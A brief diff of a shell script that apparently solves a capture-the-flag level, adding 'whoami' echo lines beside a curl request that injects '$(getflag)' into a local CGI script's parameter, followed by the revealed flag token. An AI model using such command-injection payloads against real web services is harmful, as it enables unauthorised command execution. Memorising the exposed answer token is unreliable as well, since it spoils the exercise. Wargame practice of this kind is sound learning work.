@@ -19,6 +19,9 @@ read pause
 # CGI reader content.
 # Acess with curl and pass the params
 
+echo $(whoami)
+echo whoami
+
 ssh 'curl "http://localhost:4747/level04.pl?x=\$(getflag)"'
 
 # Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
